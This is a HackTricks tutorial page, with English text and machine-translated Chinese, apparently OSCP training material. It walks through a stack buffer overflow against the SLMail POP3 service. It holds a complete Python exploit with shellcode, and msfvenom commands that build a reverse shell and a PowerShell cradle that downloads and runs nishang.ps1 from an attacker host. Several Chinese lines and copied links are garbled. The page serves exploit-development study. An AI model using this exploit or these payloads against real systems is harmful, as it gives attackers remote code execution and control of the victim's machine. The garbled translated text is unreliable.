# Windows Exploiting (Basic Guide - OSCP lvl)

＃Windows利用（基本指南-OSCP LVL）

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

## **Start installing the SLMail service**

## **开始安装Slmail服务**

## Restart SLMail service

##重新启动Slmail服务

Every time you need to **restart the service SLMail** you can do it using the windows console:

每次您需要**重新启动服务slmail **时，都可以使用Windows控制台进行操作：

```
net start slmail
```

![](<../.gitbook/assets/image (23).png>)

## Very basic python exploit template

##非常基本的Python利用模板

```python
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

buffer = 'A' * 2700
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
```

## **Change Immunity Debugger Font**

Go to `Options >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK`

转到“选项>>外观>>字体>>更改（Consolas，Blod，9）>> OK”

## **Attach the proces to Immunity Debugger:**

## **将验证物附加到免疫调试器上：**

**File --> Attach**

![](<../.gitbook/assets/image (24) (1).png>)

**And press START button**

**并按开始按钮**

## **Send the exploit and check if EIP is affected:**

## **发送利用并检查EIP是否受到影响：**

![](<../.gitbook/assets/image (25).png>)

Every time you break the service you should restart it as is indicated in the beginnig of this page.

每次打破服务时，都应按照此页面的开始中的指示重新启动它。

## Create a pattern to modify the EIP

##创建一个模式来修改EIP

The pattern should be as big as the buffer you used to broke the service previously.

该图案应与您以前打破服务的缓冲区一样大。

![](<../.gitbook/assets/image (26).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Change the buffer of the exploit and set the pattern and lauch the exploit.

更改利用的缓冲区并设置模式并启动利用。

A new crash should appeard, but with a different EIP address:

应该出现新的崩溃，但具有不同的EIP地址：

![](<../.gitbook/assets/image (27).png>)

Check if the address was in your pattern:

检查地址是否处于您的模式：

![](<../.gitbook/assets/image (28).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438
```

Looks like **we can modify the EIP in offset 2606** of the buffer.

看起来**我们可以在缓冲区的偏移2606 **中修改EIP。

Check it modifing the buffer of the exploit:

检查它修改了利用的缓冲区：

```
buffer = 'A'*2606 + 'BBBB' + 'CCCC'
```

With this buffer the EIP crashed should point to 42424242 ("BBBB")

使用此缓冲区，EIP崩溃应指向42424242（“ BBBB”）

![](<../.gitbook/assets/image (30).png>)

![](<../.gitbook/assets/image (29).png>)

Looks like it is working.

## Check for Shellcode space inside the stack

##检查堆栈内的壳牌空间

600B should be enough for any powerfull shellcode.

600B应该足以容纳任何强大的壳牌。

Lets change the bufer:

让我们更改缓冲区：

```
buffer = 'A'*2606 + 'BBBB' + 'C'*600
```

launch the new exploit and check the EBP and the length of the usefull shellcode

启动新的漏洞利用并检查EBP和有用shellCode的长度

![](<../.gitbook/assets/image (31).png>)

![](<../.gitbook/assets/image (32).png>)

You can see that when the vulnerability is reached, the EBP is pointing to the shellcode and that we have a lot of space to locate a shellcode here.

您可以看到，当达到漏洞时，EBP指向壳牌码，并且我们有很多空间可以在此处找到壳牌。

In this case we have **from 0x0209A128 to 0x0209A2D6 = 430B.** Enough.

在这种情况下，我们有**从0x0209A128到0x0209a2d6 = 430b。**足够了。

## Check for bad chars

##检查不良的chars

Change again the buffer:

再次更改缓冲区：

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = 'A'*2606 + 'BBBB' + badchars
```

The badchars starts in 0x01 because 0x00 is almost always bad.

Badchars从0x01开始，因为0x00几乎总是不好的。

Execute repeatedly the exploit with this new buffer delenting the chars that are found to be useless:.

用这个新的缓冲区反复执行漏洞利用，从而散布发现没有用的字符：

For example:

例如：

In this case you can see that **you shouldn't use the char 0x0A** (nothing is saved in memory since the char 0x09).

在这种情况下，您可以看到**您不应该使用char 0x0a **（由于char 0x09以来，没有保存在内存中）。

![](<../.gitbook/assets/image (33).png>)

In this case you can see that **the char 0x0D is avoided**:

在这种情况下，您可以看到** char 0x0d被避免**：

![](<../.gitbook/assets/image (34).png>)

## Find a JMP ESP as a return address

##找到JMP ESP作为返回地址

Using:

```
!mona modules    #Get protections, look for all false except last one (Dll of SO)
```

You will **list the memory maps**. Search for some DLl that has:

您将**列出内存图**。 搜索一些具有：

* **Rebase: False**
* **SafeSEH: False**
* **ASLR: False**
* **NXCompat: False**

* **NXCompat: False**
* **OS Dll: True**

![](<../.gitbook/assets/image (35).png>)

Now, inside this memory you should find some JMP ESP bytes, to do that execute:

现在，在此内存中，您应该找到一些JMP ESP字节，以执行该操作：

```
!mona find -s "\xff\xe4" -m name_unsecure.dll # Search for opcodes insie dll space (JMP ESP)
!mona find -s "\xff\xe4" -m slmfc.dll # Example in this case
```

**Then, if some address is found, choose one that don't contain any badchar:**

**然后，如果找到某个地址，请选择一个不包含任何坏char的地址：**

![](<../.gitbook/assets/image (36).png>)

**In this case, for example: \_0x5f4a358f**\_

**在这种情况下，例如：\ _0x5f4a358f ** \ _

## Create shellcode

##创建ShellCode

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\x00\x0a\x0d'
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -f python -b '\x00\x0a\x0d'
```

If the exploit is not working but it should (you can see with ImDebg that the shellcode is reached), try to create other shellcodes (msfvenom with create different shellcodes for the same parameters).

如果利用不起作用，但应该（您可以在IMDEBG上看到达到ShellCode的到达），请尝试创建其他shellcodes（MSFvenom，用相同参数创建不同的shellcodes）。

**Add some NOPS at the beginning** of the shellcode and use it and the return address to JMP ESP, and finish the exploit:

**在shellcode的开头**添加一些NOP，并使用它以及返回地址为JMP ESP，然后完成利用：

```bash
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

shellcode = (
"\xb8\x30\x3f\x27\x0c\xdb\xda\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x75\x31\xc5\xf9\x89\xa5\x8b"
"\x02\x71\x36\xec\x8b\x94\x07\x2c\xef\xdd\x38\x9c\x7b\xb3\xb4"
"\x57\x29\x27\x4e\x15\xe6\x48\xe7\x90\xd0\x67\xf8\x89\x21\xe6"
"\x7a\xd0\x75\xc8\x43\x1b\x88\x09\x83\x46\x61\x5b\x5c\x0c\xd4"
"\x4b\xe9\x58\xe5\xe0\xa1\x4d\x6d\x15\x71\x6f\x5c\x88\x09\x36"
"\x7e\x2b\xdd\x42\x37\x33\x02\x6e\x81\xc8\xf0\x04\x10\x18\xc9"
"\xe5\xbf\x65\xe5\x17\xc1\xa2\xc2\xc7\xb4\xda\x30\x75\xcf\x19"
"\x4a\xa1\x5a\xb9\xec\x22\xfc\x65\x0c\xe6\x9b\xee\x02\x43\xef"
"\xa8\x06\x52\x3c\xc3\x33\xdf\xc3\x03\xb2\x9b\xe7\x87\x9e\x78"
"\x89\x9e\x7a\x2e\xb6\xc0\x24\x8f\x12\x8b\xc9\xc4\x2e\xd6\x85"
"\x29\x03\xe8\x55\x26\x14\x9b\x67\xe9\x8e\x33\xc4\x62\x09\xc4"
"\x2b\x59\xed\x5a\xd2\x62\x0e\x73\x11\x36\x5e\xeb\xb0\x37\x35"
"\xeb\x3d\xe2\x9a\xbb\x91\x5d\x5b\x6b\x52\x0e\x33\x61\x5d\x71"
"\x23\x8a\xb7\x1a\xce\x71\x50\x2f\x04\x79\x89\x47\x18\x79\xd8"
"\xcb\x95\x9f\xb0\xe3\xf3\x08\x2d\x9d\x59\xc2\xcc\x62\x74\xaf"
"\xcf\xe9\x7b\x50\x81\x19\xf1\x42\x76\xea\x4c\x38\xd1\xf5\x7a"
"\x54\xbd\x64\xe1\xa4\xc8\x94\xbe\xf3\x9d\x6b\xb7\x91\x33\xd5"
"\x61\x87\xc9\x83\x4a\x03\x16\x70\x54\x8a\xdb\xcc\x72\x9c\x25"
"\xcc\x3e\xc8\xf9\x9b\xe8\xa6\xbf\x75\x5b\x10\x16\x29\x35\xf4"
"\xef\x01\x86\x82\xef\x4f\x70\x6a\x41\x26\xc5\x95\x6e\xae\xc1"
"\xee\x92\x4e\x2d\x25\x17\x7e\x64\x67\x3e\x17\x21\xf2\x02\x7a"
"\xd2\x29\x40\x83\x51\xdb\x39\x70\x49\xae\x3c\x3c\xcd\x43\x4d"
"\x2d\xb8\x63\xe2\x4e\xe9"
)

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
```

{% hint style="warning" %}

{％提示样式=“警告”％}
There are shellcodes that will **overwrite themselves**, therefore it's important to always add some NOPs before the shellcode

有些壳编码会**覆盖自己**，因此，在shellCode之前始终添加一些NOP很重要
{% endhint %}

## Improving the shellcode

##改进外壳

Add this parameters:

添加此参数：

```
EXITFUNC=thread -e x86/shikata_ga_nai
```

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
